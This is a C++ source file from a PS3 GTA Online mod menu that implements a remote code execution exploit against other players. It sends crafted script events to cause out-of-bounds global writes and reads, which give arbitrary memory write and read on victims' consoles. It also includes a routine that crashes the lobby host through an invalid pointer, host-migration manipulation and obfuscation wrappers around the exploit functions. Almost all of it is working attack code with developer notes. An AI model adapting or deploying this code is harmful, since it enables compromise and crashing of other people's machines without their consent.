// https://github.com/gopro2027/GTAOnline-RCE
// RIP GTA Online PS3 Gone Too Soon


#pragma once

#define RCE

void runStatFile(char* file, void(*func)(int type, int stat, int value));
void runNativeFile(char* file, int(*callNative)(unsigned int native, int r3, int r4, int r5, int r6, int r7, int r8, int r9));

void testGlobalBruteForce(int globalID, int size, int value = 0x7FFFFFFF) {
	for (int i = 0; i < size; i++) {
		int v = Read_Global(globalID + i);
		if (v > 0x12 || v < 1)//0x12 commonly used as the arrays size thing
			Write_Global(globalID + i, value);
	}
}

int hostGlobalsArr[15] = { 2387877,2388179,2378765,2388295,2388936,2389146,2389371,2389701,2390030,2468303,1572928,1588610,1666034,1673856,1591180 };
int hostGlobalsArrSize[15] = { 302,116,1689,641,210,225,330,329,171,76,238,19,35,268,4 };

/*
Global_2388179.imm_79[uVar1 <2>] = iVar0;
Global_2388179.imm_79[uVar1 <2>].imm_1 = iVar2;
setting those both to 21 can mess it up

if (Global_2388179.imm_79[player_id() <2>] != -1)
			{
				Global_2394218.imm_2563 = Global_2388179.imm_79[player_id() <2>];
				func_3049(2);
			}

			this is called









void func_6151(var uParam0)
{
	struct<4> Var0;
	int iVar1;

	if (get_event_data(1, uParam0, &Var0, 4))
	{
		iVar1 = func_6154(Var0.imm_2);//Global_2389701.imm_184[uParam0 <8>].imm_5;
		iVar1 += Var0.imm_3;
		if (iVar1 < 0)
		{
			func_6153(Var0.imm_2, 0);
		}
		else if (IntToFloat(iVar1) > Global_262145.imm_107)
		{
			func_6152(Var0);
		}
		else
		{
			func_6153(Var0.imm_2, iVar1);//possibble rce
		}
	}
}

case 202:
void func_6153(var uParam0, var uParam1)
{
	Global_2389701.imm_184[uParam0 <8>].imm_5 = uParam1;
}

var func_6154(var uParam0)
{
	return Global_2389701.imm_184[uParam0 <8>].imm_5;
}








//better exploit
void func_6175(var uParam0)
{
	struct<5> Var0;

	if (get_event_data(1, uParam0, &Var0, 5))
	{
		if (Global_2428620.imm_241 == Var0.imm_2)
		{
			Global_2428620.imm_241.imm_1++;
			Global_2428620.imm_241.imm_40[Var0.imm_1] = Var0.imm_4;
		}
	}
}


*/
//set global 2 to 2 to force join a new session
__attribute((noinline)) void executeRCEV1(int player, int global, int valueToAdd) {

	encryptFunctionStart((void*)executeRCEV1);

	unsigned int playerBit = (1 << player);

	//index -298736 = global id 2
	//int global = 2389701+184+i*8+5;
	if ((global - 2) % 8 == 0) {
		//works!
	}
	else {
		//print2("Error! Cannot set right value. Check console.");
		//printf("Remainder on calculation of global %i is %i", global, (global - 2) % 8);
	}

	int index = (global - 2389890) / 8;

	int arrayIndex = index;
	int valueAddedOn = valueToAdd;
	//Global_2389701.imm_184[arrayIndex <8>].imm_5 = Global_2389701.imm_184[arrayIndex <8>].imm_5 + valueAddedOn;  is what gets calculated
	ScriptArg args[4] = { 202,player,arrayIndex,valueAddedOn };
	//the end value range set much be between 0 and 60000 (int), if it's less than 0 it goes up to 0, greater than 60000 and idk the behavior
	SCRIPT::TRIGGER_SCRIPT_EVENT(1, args, 4, playerBit);

	encryptFunctionEnd();
}

__attribute((noinline)) void executeRCEV2(int player, int global, int value) {
	encryptFunctionStart((void*)executeRCEV2);
	int index = global - 2428901;
	int arrayIndex = index;
	int valueToMatch = Read_Global(2428620 + 241);//0 usually I think
	//printf("Value to match: %i\n", valueToMatch);
	ScriptArg args[5] = { 66,arrayIndex,valueToMatch,0/*unused*/,value };
	//sets Global_2428620.imm_241.imm_40[Var0.imm_1] = Var0.imm_4;//array is size of 18
	unsigned int playerBit = (1 << player);
	SCRIPT::TRIGGER_SCRIPT_EVENT(1, args, 5, playerBit);
	encryptFunctionEnd();
}




/*
Host globals found in trigger script event:
Searching "Global_2387877":
File: C:\Users\Tyler\Desktop\scriptsWglobals\freemode.c Line: 313294  no
File: C:\Users\Tyler\Desktop\scriptsWglobals\freemode.c Line: 313342  no
File: C:\Users\Tyler\Desktop\scriptsWglobals\freemode.c Line: 313825  maybe (long)
Searching "Global_2388179":
File: C:\Users\Tyler\Desktop\scriptsWglobals\freemode.c Line: 312643  no array
File: C:\Users\Tyler\Desktop\scriptsWglobals\freemode.c Line: 312653  no array
Searching "Global_2378765":
File: C:\Users\Tyler\Desktop\scriptsWglobals\freemode.c Line: 306779  no
File: C:\Users\Tyler\Desktop\scriptsWglobals\freemode.c Line: 306998  yes but array is size of 74 and contains multiple spots that would have to be overflowed
File: C:\Users\Tyler\Desktop\scriptsWglobals\freemode.c Line: 307047  yes like above but only 2 spots that have to be overflowed
File: C:\Users\Tyler\Desktop\scriptsWglobals\freemode.c Line: 307076  yes like above but only 1 spot, could be good!
File: C:\Users\Tyler\Desktop\scriptsWglobals\freemode.c Line: 307104  no lots of code
File: C:\Users\Tyler\Desktop\scriptsWglobals\freemode.c Line: 307331  no probably not
Searching "Global_2388295":
File: C:\Users\Tyler\Desktop\scriptsWglobals\freemode.c Line: 309979  no large function
Searching "Global_2388936":
Searching "Global_2389146":
File: C:\Users\Tyler\Desktop\scriptsWglobals\freemode.c Line: 312419  no
Searching "Global_2389371":
Searching "Global_2389701":
File: C:\Users\Tyler\Desktop\scriptsWglobals\freemode.c Line: 312118  yes but only on intervals of 10 and bit set
File: C:\Users\Tyler\Desktop\scriptsWglobals\freemode.c Line: 312217  no
Searching "Global_2390030":
File: C:\Users\Tyler\Desktop\scriptsWglobals\freemode.c Line: 313582  yes but has some weird bit stuff that might make it hard
File: C:\Users\Tyler\Desktop\scriptsWglobals\freemode.c Line: 313604  yes same as above
File: C:\Users\Tyler\Desktop\scriptsWglobals\freemode.c Line: 313626  no
File: C:\Users\Tyler\Desktop\scriptsWglobals\freemode.c Line: 313644  YES really good but only set to -1, event 20 trigger script
File: C:\Users\Tyler\Desktop\scriptsWglobals\freemode.c Line: 313662  yes same as above
File: C:\Users\Tyler\Desktop\scriptsWglobals\freemode.c Line: 318447  no long
Searching "Global_2468303":
Searching "Global_1572928":
File: C:\Users\Tyler\Desktop\scriptsWglobals\freemode.c Line: 298534  no long
File: C:\Users\Tyler\Desktop\scriptsWglobals\freemode.c Line: 305690  YES but have to call 32 times per global to set each  bit, also only value is 0 (only clear bits)
File: C:\Users\Tyler\Desktop\scriptsWglobals\freemode.c Line: 310851  no
File: C:\Users\Tyler\Desktop\scriptsWglobals\freemode.c Line: 310861  no
File: C:\Users\Tyler\Desktop\scriptsWglobals\freemode.c Line: 312750  no  almost thought it would be Global_2410912.imm_1581.imm_19[uVar2] = -1; but it's not a special global
File: C:\Users\Tyler\Desktop\scriptsWglobals\freemode.c Line: 313002  no long
File: C:\Users\Tyler\Desktop\scriptsWglobals\freemode.c Line: 313182  no
File: C:\Users\Tyler\Desktop\scriptsWglobals\freemode.c Line: 313825  no
File: C:\Users\Tyler\Desktop\scriptsWglobals\freemode.c Line: 318447  no long
Searching "Global_1588610":
Searching "Global_1666034":
File: C:\Users\Tyler\Desktop\scriptsWglobals\freemode.c Line: 306293  yes This could be used to read
File: C:\Users\Tyler\Desktop\scriptsWglobals\freemode.c Line: 306355  no
File: C:\Users\Tyler\Desktop\scriptsWglobals\freemode.c Line: 306433  no
File: C:\Users\Tyler\Desktop\scriptsWglobals\freemode.c Line: 306469  no
File: C:\Users\Tyler\Desktop\scriptsWglobals\freemode.c Line: 306506  yes this coulld be used to read by setting Var0.imm_3 to -max
File: C:\Users\Tyler\Desktop\scriptsWglobals\freemode.c Line: 306577  YES.... not part of trigger script event, it's event 317 YES nearly perfect one
File: C:\Users\Tyler\Desktop\scriptsWglobals\freemode.c Line: 306614  no
File: C:\Users\Tyler\Desktop\scriptsWglobals\freemode.c Line: 306638  no
File: C:\Users\Tyler\Desktop\scriptsWglobals\freemode.c Line: 306660  no
File: C:\Users\Tyler\Desktop\scriptsWglobals\freemode.c Line: 306698  no
File: C:\Users\Tyler\Desktop\scriptsWglobals\freemode.c Line: 313825  no
Searching "Global_1673856":
Searching "Global_1591180":


*/


//line 306506 test
__attribute((noinline)) void executeRCEV3(int player, int global, int valueToAdd) {
	encryptFunctionStart((void*)executeRCEV3);
	//first, take control of Global_1666034
	if (!assureHostOfFreemode())
		return;
	//printf("Running it all\n");
	//second, set global 1666035 to be 0x7FFFFFFF to maximize the array size
	Write_Global(1666035, 0x7FFFFFFF);
	//third, set Global_1666034.imm_1[4] to be the same as valueToAdd for the last if statement to pass
	Write_Global(1666035 + 1 + 4, valueToAdd);
	//fourth, Global_1666034.imm_1[index] (value being set) must be less than whatever Global_262145.imm_6760 is on their system to start (0x46 or something?) so the first 2 if's don't pass
	int index = global - (1666035 + 1);//so if the global was index 0 of the array (1666036), it would result to (1666036 - (1666035+1)) which is 0
	//valueToAdd must be greater than 0 for the first tests to work

	ScriptArg args[4] = { 318,0,index,valueToAdd };

	unsigned int playerBit = (1 << player);
	SCRIPT::TRIGGER_SCRIPT_EVENT(1, args, 4, playerBit);
	encryptFunctionEnd();
}

//line 313644
//This works but I'm abandoning it for V5 which allows me to choose the value also
__attribute((noinline)) void executeRCEV4(int player, int global) {
	encryptFunctionStart((void*)executeRCEV4);
	//using index 1215752191 on this (so global 1215752191 + 2390071+1=1218142263 it tried to write to address 0x0558DBAEC  )


	//first, take control of Global_1666034
	if (!assureHostOfFreemode())
		return;
	//printf("Running it all new\n");
	//second, set global 2390071 to be 0x7FFFFFFF to maximize the array size
	Write_Global(2390071, 0x7FFFFFFF);
	int index = global - (2390071 + 1);   //2390072 and 262144
	//                    1590566
	if (index < 0) {
		//print2("Fail!");
		//printf("");
	}

	ScriptArg args[4] = { 20,0,index,false };

	unsigned int playerBit = (1 << player);
	SCRIPT::TRIGGER_SCRIPT_EVENT(1, args, 4, playerBit);
	encryptFunctionEnd();
}

bool readyForRCEReadValue = false;

//Line: 305690
__attribute((noinline)) void initRCEV6() {
	encryptFunctionStart((void*)initRCEV6);
	//this one is for bit writing
	//first, take control of Global_1572928
	if (!assureHostOfFreemode()) {
		print2("~r~Please try again");
		return;
	}

	//iincreae size of 1572928.imm_120
	Write_Global(1572928 + 120, 0x7FFFFFFF);



	//this one is actuallyy for the write method:
	Write_Global(1666034 + 1, 0x7FFFFFFF);//the array
	Write_Global(1666038, 0x7FFFFFFF);//this one needs to be re-written every time unless the value at it is greater than Global_262145.imm_6760, bbut can only


	readyForRCEReadValue = true;//make it say it's ready in case it gets messed up

	encryptFunctionEnd();
}

/*
int readValueReturnVal = 0;
bool gotReadValueReturn = false;
bool getReturnValueOfRun(int *save) {
	if (gotReadValueReturn) {
		*save = readValueReturnVal;
		gotReadValueReturn = false;
		return true;
	} else {
		*save = 0;
		return false;
	}
}*/


bool pleaseWaitASecond = false;
bool awaitingRCEReset = false;
int rcegottenvaluereturn = 0;
void((*callbackOnResultValue2)(int)) = 0;
void callbackOnResultValue3() {
	readyForRCEReadValue = true;
	callbackOnResultValue2(rcegottenvaluereturn);
	pleaseWaitASecond = false;
	awaitingRCEReset = false;
}

void findNextIndexOfDataCallback(int valueGotten);
int echoreadvaluetmpplayerid = 0;
void executeRCEV5(int player, int global, int value);
void((*callbackOnResultValue)(int)) = 0;
__attribute((noinline)) void testPrintResultValue(int) {

	encryptFunctionStart((void*)testPrintResultValue);

	//try fiinding address 0x1891568 which is 0x744E6577
	//assume the value is greater than Global_262145.imm_6760 so it hits the neat one
	int absOfResultValue = Read_Global(1666038) - 0x7FFFFFFF/*previous value of this*/ + 0x46;//lmao I guess it's the 46 cuz of that weird fuckin value
	//readValueReturnVal = absOfResultValue;
	//printf("Result value: 0x%X %i    callback: 0x%X 0x%X 0x%X\n", absOfResultValue, absOfResultValue, callbackOnResultValue, (int)findNextIndexOfDataCallback, *(int*)(int)findNextIndexOfDataCallback);
	//gotReadValueReturn = true;//This is used for the init method or somethiing idk anymore
	executeRCEV5(echoreadvaluetmpplayerid, 1666038, 0x7FFFFFFF);//reset the value back to the origiinal lmao
	//Write_Global(1666038,0x7FFFFFFF);
	if (callbackOnResultValue != 0) {
		void((*tmp)(int)) = callbackOnResultValue;
		callbackOnResultValue = 0;
		//readyForRCEReadValue = true;
		//tmp(absOfResultValue);
		callbackOnResultValue2 = tmp;
		pleaseWaitASecond = true;
		awaitingRCEReset = true;
		rcegottenvaluereturn = absOfResultValue;
		//runlater::runlater(timeoutvaluetest,callbackOnResultValue3,absOfResultValue);//need to give it some time before reading again so it can reset on fast ones because I am still getting duplicate data
	}
	else {
		readyForRCEReadValue = true;
		pleaseWaitASecond = false;
	}

	encryptFunctionEnd();

}

//int echoStartValueOfItTimeout = 70;//50 did not give good results

void dummyfunc(int) {}
bool outputTheEchoTestValues = false;
void echoStartValueOfIt_loop() {

	if (readyForRCEReadValue == false && pleaseWaitASecond == false) {
		if (Read_Global(1666038) != 0x7FFFFFFF) {
			//value ready
			runlater_second::runlater(0, dummyfunc);
			testPrintResultValue(0);
		}
	}
	
	if (readyForRCEReadValue == false && awaitingRCEReset == true) {
		//printf("GOT IN HERE 0x%X\n", Read_Global(1666038));
		if (Read_Global(1666038) == 0x7FFFFFFF) {
			//it is reset now
			//printf("CALLING THE CALLBACK PART!\n");
			callbackOnResultValue3();
		}
	}
	if (outputTheEchoTestValues) {
		//printf("readyForRCEReadValue: %i, awaitingRCEReset: %i\n", readyForRCEReadValue, awaitingRCEReset);
	}
}

__attribute((noinline)) void echoStartValueOfIt(int player, int global, void (*callback)(int) = 0) {

	encryptFunctionStart((void*)echoStartValueOfIt);

	if (readyForRCEReadValue == false) {
		//printf("Not ready to read yet!\n");
		//return;
		//just go to end lol
	} else {

		if (callback != 0)
			callbackOnResultValue = callback;

		Write_Global(1666038, 0x7FFFFFFF);//this is just on my system but it's also important
		echoreadvaluetmpplayerid = player;
		executeRCEV5(echoreadvaluetmpplayerid, 1666038, 0x7FFFFFFF);//reset the value on their system

		readyForRCEReadValue = false;//make sure it's not timed out

		//gotReadValueReturn = false;
		int checkValue = Read_Global(262145 + 6760);
		if (Read_Global(1666038) <= checkValue) {
			//print2("Need to re-setup!");
			//return;
		}


		//func_5930
		//1666035 is in the same global area as the main write
		//just add 0x18 to the address of this global (1666035) to get the address of the main global
		int index = global - (1666035 + 1);//this is the index of what gets read back to us
		if (index < 0) {
			index = 0x7FFFFFFF + (index + 1);
		}

		//printf("Index: 0x%X %i\n",index,index);

		ScriptArg args[6] = { 328,player,2/*the value I chose. imm 2 so why not use 2, it's the iindex I will read from in the end*/,0x80000000/*min int*/,0/*unk imm4*/,index };

		//Global_1666034.imm_1[imm_2/*2*/] = 0x7FFFFFFF;//also needed to bbyypass size check
												 //the value we read gets added to this value
												 //global 1666038

		//Global_1666034.imm_1 = 0x7FFFFFFF;//set array to be max int size

		//Global_1666034.imm_1[Var0.imm_5] //is the value read, but will come back

		unsigned int playerBit = (1 << player);

		SCRIPT::TRIGGER_SCRIPT_EVENT(1, args, 6, playerBit);


		//return value: global 1666038
		//int absOfResultValue = Read_Global(1666038)-0x7FFFFFFF/*previous value of this*/;
		runlater_second::runlater(100, testPrintResultValue);

	}

	encryptFunctionEnd();

}



__attribute((noinline)) void RCEV6(int player, int global, int bit) {


	encryptFunctionStart((void*)RCEV6);

	//Global_1572928 is on the same section as the other one

	if (Read_Global(1573048) != 0x7FFFFFFF) {
		//print2("v6 Not ready!");
		//return;
	}
	else {
		if (getHostOfFreemodeScript() != player) {
			//print2("host is not selected player!");
			//return;
		}
		else {

			int index = global - (1573048 + 1);

			if (index < 0) {
				int tmpindex = index;
				index = 0x7FFFFFFF + (index + 1);
				//printf("Global (v6): %i, Ni: 0x%X, Oi: %i\n",global,index,tmpindex);
			}




			ScriptArg args[4] = { 290,bit,bit/*shouldn't use this imm2 unless index is a small number and passes the if statement check*/,index };
			unsigned int playerBit = (1 << player);

			SCRIPT::TRIGGER_SCRIPT_EVENT(1, args, 5, playerBit);
		}
	}

	encryptFunctionEnd();
}


__attribute((noinline)) void giveHostToPlayer(int player) {
	encryptFunctionStart((void*)giveHostToPlayer);
	//printf("Requesting host...\n"); 
	if (freemodeScriptCGameScriptHandlerNetwork != 0) {
		suggestHost(0);//make it so host gets transferred to the other guy now
		if (player == PLAYER::PLAYER_ID())
			suggestHost(1);//highly suggest
		if (getHostOfFreemodeScript() != player) {
			CNetGamePlayer* cnet = getCNetGamePlayer(player);
			if (cnet != 0) {
				//This always makes it go to me
				//I don't think this function does jack shit... It seems to be called all the time no matter what anyways???
				CGameScriptHandlerNetComponent_msgScriptHostRequest(freemodeScriptCGameScriptHandlerNetwork->cGameScriptHandlerNetComponentSyncOne);//g_N4rage20msgScriptHostRequest12AutoIdDes  THIS VERIFIES ME AS HOST IM PRETTY SURE AND 

				//This one is the actual one that requests the script host change to the player, but I beleive it also compares my time so i have to do suggestHost(0) first and if i dont then it will go back to me
				sub_483A58(freemodeScriptCGameScriptHandlerNetwork->cGameScriptHandlerNetComponentSyncOne, cnet);//global_msgScriptMigrateHost
			}
		}
	}
	//printf("Requested host...\n");
	encryptFunctionEnd();
}

__attribute((noinline)) void crashScriptHost(int player) {
	encryptFunctionStart((void*)crashScriptHost);

	
	//freezePlayerEvent(player);//i have no idea if this works but fake it

	if (getHostOfFreemodeScript() != player) {
		//print2("~r~Please Try Again");
	}
	else {
		//only works on lobby scritp host, will crash them inside the jenkins hash function on set_override_weather
		char* weatherValuePointer = (char*)0x4;//0 = null pointer, it's a broken script event and accepts pointer for some reason... 0 wont work tho cuz it will bypass the 0 on the func, try a different invalid address like 0x4
		ScriptArg args[3] = { 16,player,(int)weatherValuePointer };
		unsigned int playerBit = (1 << player);
		SCRIPT::TRIGGER_SCRIPT_EVENT(1, args, 3, playerBit);
		//print2("~b~Player Frozen in here!");
	}

	runlater::runlater(100, freezePlayerV4, player);
	//freezePlayerV4(player);//this one actually works, just curious if it will cause a crash first, also if i did more research on it I could make this very powerful

	
	//freezePlayerBy16Event(player);//this one doesn't seem to work but why not, fake it

	encryptFunctionEnd();
}

__attribute((noinline)) void crashScriptHostStart(int player) {

	encryptFunctionStart((void*)crashScriptHostStart);

	CNetGamePlayer* cnet = getCNetGamePlayer(player);
	if (!assureHostOfFreemode() || cnet == 0) {
		print2("~r~Please try again");
		
	}
	else {


		//print2("Working...");
		giveHostToPlayer(player);
		runlater::runlater(200, crashScriptHost, player);
		print2("~g~Player Frozen!");
	}
	encryptFunctionEnd();
}

__attribute((noinline)) void initRCEV5Finalize(int player) {
	encryptFunctionStart((void*)initRCEV5Finalize);

	suggestHost(0);//make it so host gets transferred to the other guy now
						//okay so this can stay as suggest because we don't reaaallly care about the host changing until phase 2. This is phase 1. This only only assists in the host change by suggestHost(0)
		//assureHostOfFreemode();

		/*This works... but only locally. test_send_msgScriptMigrateHost only sets it for ourself and doesn't for everyone else. If we somehow managed to get this to call on their system though...*/
	//test_CGameScriptHandlerNetComponent_msgScriptHostRequest();
	CNetGamePlayer* cnet = getCNetGamePlayer(player);
	if (cnet != 0) {
		CGameScriptHandlerNetComponent_msgScriptHostRequest(freemodeScriptCGameScriptHandlerNetwork->cGameScriptHandlerNetComponentSyncOne);
		//test_send_msgScriptMigrateHost(player);
		sub_483A58(freemodeScriptCGameScriptHandlerNetwork->cGameScriptHandlerNetComponentSyncOne, cnet);

	}
	
	print2("~g~Ready! Time for 'Phase 2'", 60000);
	readyForRCEReadValue = true;

	encryptFunctionEnd();
}

__attribute((noinline)) void initRCEV5(int player = 0) {

	encryptFunctionStart((void*)initRCEV5);

	//first, take control of Global_1666034
	CNetGamePlayer* cnet = getCNetGamePlayer(player);
	if (!assureHostOfFreemode() || cnet == 0) {
		print2("~r~Please try again");
		//return;
	}
	else {
		//Global_1666034.imm_7[Var0.imm_2] = Var0.imm_3;
		Write_Global(1666041, 0x7FFFFFFF);

		//also need to set 1666034.imm_12 size because it's read in the code (with the same index we send) and it will crash from out of bounds
		Write_Global(1666034 + 12, 0x7FFFFFFF);//maybe setting it negative fixes it lmao

		initRCEV6();

		//print2("Please wait a moment...");
		runlater::runlater(100,initRCEV5Finalize,player);

	}
	encryptFunctionEnd();
}


//line Line: 306577
bool doRCEV5NegativeFix = true;
__attribute((noinline)) void executeRCEV5(int player, int global, int value) {


	encryptFunctionStart((void*)executeRCEV5);

	//2147483646 will give 1 behind the array aka 0x7FFFFFFE

	//to find this function for pc, search ".f_7[Var0" in the freemode.c and it will get you there

	if (Read_Global(1666041) != 0x7FFFFFFF) {
		//print2("Not ready!");
		//return;
	}
	else {
		assureHostOfFreemode(player);//this is necessary, function now works, just slowly
		if (getHostOfFreemodeScript() != player) {
			//printf("Player %i chosen, not ready %s\n", player, PLAYER::GET_PLAYER_NAME(player));
			print2("Not ready yet! Please wait a bit and retry");
			//return;
		}
		else {

			//ScriptArg rargs[3] = {195,player,0};//-1 is default value I think
			unsigned int playerBit = (1 << player);
			//SCRIPT::TRIGGER_SCRIPT_EVENT(1,rargs,3,playerBit);

			int index = global - (1666041 + 1);

			if (index < 0) {
				//print2("Fail!");
				//printf("Cannot set a negative value %i\n",index);
				//0x7FFFFFFE = Global_1666040
				//1666040 - (1666041+1) = -2 which makes sense
				int tmpindex = index;
				index = 0x7FFFFFFF + (index + 1);
				//1666040 should return 0x7FFFFFFE
				//printf("Global: %i, Ni: 0x%X, Oi: %i\n",global,index,tmpindex);
			}

			bool isTopBitSet = ((int)(value & (1 << 31)) >> 31);
			if (doRCEV5NegativeFix) {
				value = value | (1 << 31);//make sure it is negative, otherwise you will get freemode script crash
			}
			ScriptArg args[5] = { 317,0,index,value/*imm3*/,-1/*player id, set to -1 to do nothing on last*/ };


			SCRIPT::TRIGGER_SCRIPT_EVENT(1, args, 5, playerBit);

			if (doRCEV5NegativeFix) {
				if (!isTopBitSet) {
					//clear the top bit with the v6 method
					RCEV6(player, global, 31);//This does appear to work on tests, setting 0x70000000 will result in F0 if this function is not called
				}
			}

			//now call script event 195 to reset the value we just set wrong on accident via the previous trigger
			//func_6131 would fix the value that was set
			//SCRIPT::TRIGGER_SCRIPT_EVENT(1,rargs,3,playerBit);
		}
	}
	encryptFunctionEnd();
}

__attribute((noinline)) void executeRCEV5Offset(int player, int offset, int value) {
	encryptFunctionStart((void*)executeRCEV5Offset);
	executeRCEV5(player, (1666041 + 1) + offset, value);
	encryptFunctionEnd();
}

__attribute((noinline)) void echoStartValueOfItOffset(int player, int offset, void (*callback)(int) = 0) {
	encryptFunctionStart((void*)echoStartValueOfItOffset);
	echoStartValueOfIt(player, (1666035 + 1) + offset, callback);
	encryptFunctionEnd();
}

int addressToIndexForExploit(int addressToGoTo, int addressOfArray) {
	//addressOfArray is the address with the value 0x7FFFFFFF, so we need to figure this out for other players
	//1666041 is addressOfArray which is index -1, 0x33A93FE4 on original text
	int difGlobal = (addressToGoTo - addressOfArray) / 4 - 1;
	//difGlobal   = (0x33A93FE0-0x33A93FE4)/4 - 1;
	return difGlobal;
}

int addressOfTheExploitArray = 0x33A93FE4;//this changes, have to find the new one. Address of Global_1666041
//                             0x3399CC54
int addOnToBaseExploitAddress = 0;

//writes an int32 to the address
void executeRCEV5Address(int player, int address, int value) {
	//addressOfTheExploitArray = Read_Global_Address(1666041);//REMOVE WHEN TESTING ON OTHERS
	executeRCEV5Offset(player, addressToIndexForExploit(address, addressOfTheExploitArray + addOnToBaseExploitAddress), value);
}

void echoStartValueOfItAddress(int player, int address, void (*callback)(int) = 0) {

	//printf("Requesting address: 0x%X\n", address);

	//address = Read_Global_Address(1666038-12);
	echoStartValueOfItOffset(player, addressToIndexForExploit(address, addressOfTheExploitArray + addOnToBaseExploitAddress - 0x18)/*0x18 because the address is -0x18 relative to the write globbal address always*/, callback);

	/*
	//positive test
	int g = 1666035+1;//index 0
	int calcindex = addressToIndexForExploit(Read_Global_Address(g),addressOfTheExploitArray+addOnToBaseExploitAddress-0x18);
	printf("Real index: %i, calced index: %i\n",g,calcindex);
	//initRCEV5();
	echoStartValueOfIt(player,calcindex);

	//negative test
	g = 1666035+1-8;//index 0
	calcindex = addressToIndexForExploit(Read_Global_Address(g),addressOfTheExploitArray+addOnToBaseExploitAddress-0x18);
	printf("Real index: %i, calced index: %i\n",g,calcindex);
	initRCEV5();
	echoStartValueOfIt(player,calcindex);*/
}

//writes a string to the address, 4 byte aligned
void executeRCEV5String(int player, int address, char* value, bool writeLineEnding = false) {
	int len = strlen(value);
	int checkamt = len;
	if (writeLineEnding == false)
		checkamt = checkamt - 1;
	len = len + (4 - (checkamt % 4));
	len /= 4;
	for (int i = 0; i < len; i++) {
		int num = *(int*)((int)value + (i * 4));
		executeRCEV5Address(player, address + (i * 4), num);
	}
}


/*void someTestStuffRCEV5Local() {
	int difOfBaseAddress = (addressOfTheExploitArray+addOnToBaseExploitAddress) - Read_Global_Address(1666041);
	printf("Difference in change: %i g: %i\n",difOfBaseAddress,difOfBaseAddress/4);
}*/

bool isBLUSVersionOfGame = false;//0x1809384 is the BLES string, 0x1824084 is BLUS string, 0x1AD00 difference blus-bles

void setPlayerNameRCEV5(int player, int name) {
	//0x41143344 is the name address
	//0x31333337
	executeRCEV5Address(player, 0x41143344, name);//1337 text
}

char rcev5TestMessageBuffer[500];
void renderTextForPlayerRCEV5(int player, char* text, bool enabled = true) {
	//0x2066FCC is the text, set text to turn on
	//0x20676DC is the value, set to 3 to turn on, 1 to turn off
	if (enabled) {
		executeRCEV5String(player, isBLUSVersionOfGame ? 0x20773CC/*BLUS*/ : 0x2066FCC, text, true);//0x20773CC BLUS
		executeRCEV5Address(player, isBLUSVersionOfGame ? 0x2077ADC/*BLUS*/ : 0x20676DC, 3);//0x2077ADC BLUS
	}
	else {
		executeRCEV5Address(player, isBLUSVersionOfGame ? 0x2077ADC : 0x20676DC, 1);//0x2077ADC BLUS
	}
}

/*void renderStringDebug(char *str, bool enabled = true) {
	if (enabled) {
		strcpy((char*)0x2066FCC,str);
		*(int*)0x20676DC = 3;
	} else {
		*(int*)0x20676DC = 1;
	}
}*/

/*
void testFindPlayersName(int player, int i) {
	char buf[8];
	snprintf(buf,sizeof(buf)," %i",i);
	int n = *(int*)buf;
	//printf("Name being set: 0x%X\n",n);
	addOnToBaseExploitAddress = i * 4096;
	setPlayerNameRCEV5(player,n);
}*/

//int recv5searchRange = 5;//getReturnValueOfRun

/*
int findRCEV5StartValuePlayer = 0;
bool findRCEV5StartValueBool = false;
int findRCEV5StartValueIndex = 0;
void findRCEV5StartValue_loop() {
	if (findRCEV5StartValueBool) {
		if (findRCEV5StartValueIndex < recv5searchRange) {
			int ret = 0;
			if (getReturnValueOfRun(&ret)) {
				printf("Value found: 0x%X,  goal: 0x%X, index: %i\n",ret,0x744E6577,findRCEV5StartValueIndex);
				if (ret == 0x744E6577) {
					print2("Found it!\n");
					printf("Found at index %i\n",findRCEV5StartValueIndex);
					findRCEV5StartValueBool = false;
				} else {
					//start next search
					findRCEV5StartValueIndex++;
					addOnToBaseExploitAddress = findRCEV5StartValueIndex * 4096;
					echoStartValueOfItAddress(findRCEV5StartValuePlayer,0x1891568);
					//0x1891568 which is 0x744E6577
				}
			}
		} else {
			findRCEV5StartValueBool = false;//stop the loop when it reaches above the max
			print2("Start not found!");
		}
	}
}
void findRCEV5StartValue_init(int player) {

	assureHostOfFreemode(player);//this is necessary, function now works, just slowly
	if (getHostOfFreemodeScript() != player) {
		print2("Not ready yet! If thi s lasts for too long, leave the lobby then rejoin.");
		return;
	}

	findRCEV5StartValuePlayer = player;
	findRCEV5StartValueBool = true;
	findRCEV5StartValueIndex = -recv5searchRange;

	//initial one
	addOnToBaseExploitAddress = findRCEV5StartValueIndex * 4096;
	echoStartValueOfItAddress(findRCEV5StartValuePlayer,0x1891568);
}*/





//10 82 12 8C 10 62 12 8C  10 84 2D C6 7C 61 01 CE
//max = 0x27F3B8+4096*3000
//min = 0x27F3B8-4096*500





struct FoundData {
	int index;
	int value;
};
int startAddressOfDataFoundReal = 0x1891528;
int indexOfDataFound = 0;
const int countOfWhichDataToFind = 8;//find 8 ints
int currentCoundOfFoundData = 0;
FoundData foundDataArray[countOfWhichDataToFind];

//bool valueForTesting = false;

bool phase2PercentOutputBool = false;
void phase2PercentOutput() {
	if (phase2PercentOutputBool) {
		float value = (float)currentCoundOfFoundData / (float)countOfWhichDataToFind;
		char buf[500];
		snprintf$(buf, sizeof(buf), "Progress: %.1f%%", value * 100);
		print2(buf);
	}
}

void searchForAddressOfFoundDataArray() {
	phase2PercentOutputBool = false;

	int start = 0x10200;//startAddressOfDataFoundReal - 4096*1500;
	int end = 0x2218296;//startAddressOfDataFoundReal + 4096*1500;

	/*
	int countOfDataToFind = countOfWhichDataToFind - 1;
	int indexOf0 = foundDataArray[0].index;
	for (int i = 1; i < countOfWhichDataToFind; i++) {
		foundDataArray[i - 1].index = foundDataArray[i].index - valueForTesting==false?0:indexOf0;
		foundDataArray[i - 1].value = foundDataArray[i].value;
	}
	*/
	

	for (int i = start; i < end; i += 4) {
		//if (*(int*)i == foundDataArray[0].value) {//don't check the first one
			int addr = i - foundDataArray[0].index * 4;
			bool match = true;
			for (int a = 1; a < countOfWhichDataToFind; a++) {
				if (*(int*)(addr + foundDataArray[a].index * 4) != foundDataArray[a].value)
					match = false;
			}
			if (match == true) {

				//addr is their equivalent of startAddressOfDataFoundReal
				int dif = addr /*+ valueForTesting */- startAddressOfDataFoundReal;
				//printf("Difference found: %i\n", dif);
				addOnToBaseExploitAddress = dif;
				print2("~g~Found and done! Time for 'Phase 3'",10000);



				//printf("Important values: base(new): 0x%X + 0x%X\n", addressOfTheExploitArray, addOnToBaseExploitAddress);
				//printf("plus 0x%X , minus 0x%X\n", addressOfTheExploitArray + addOnToBaseExploitAddress, addressOfTheExploitArray - addOnToBaseExploitAddress);
				//printf("Actual address: 0x%X\n", Read_Global_Address(1666041));
				return;
			}
		//}
	}
	print2("Did not complete :(\nTry again");
}

